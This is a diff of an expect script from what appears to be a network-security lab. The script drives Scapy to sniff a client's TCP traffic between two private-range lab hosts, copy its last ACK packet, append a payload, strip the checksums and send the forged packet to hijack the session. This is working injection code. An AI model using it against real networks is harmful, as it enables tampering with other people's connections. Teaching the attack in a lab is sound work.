@@ -29,7 +29,6 @@ expect ">>> ";
 # Type "123" in c3. What happens? 
 # type the same string again different result? Why ?
 
-
 # Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully
 
 # Horrible hack ... we sniff up to 5 packets for 10 seconds ..
@@ -42,20 +41,15 @@ send "cap = sniff(filter=\"tcp and dst host 20.20.20.55 and src host 20.20.20.89
 # We need to retrieve the last packet sent by the client,
 send "am=len(cap)-1\r"
 # am is the index of the last packet received
+# We build our data packet from the last "ACK" sent by the client
 
 send "data=cap\[am\].copy() \r"
-# how many bytes did the client sent in its last packet?
-# send "text=len(data\[Raw\].load)\r"
-# increase the seq number accordingly
-# send "data\[TCP\].seq=data\[TCP\].seq+text\r"
-
 send "command=\"12345\"\r"
 send "data=data / Raw(load=command) \r"
 send "del data\[TCP\].chksum \r"
 send "del data\[IP\].chksum \r"
 send "del data\[IP\].len \r"
 send "data\[TCP\].flags=\"PA\" \r"
-
 send "sendp(data, iface=\"eth2\") \r"
 
 
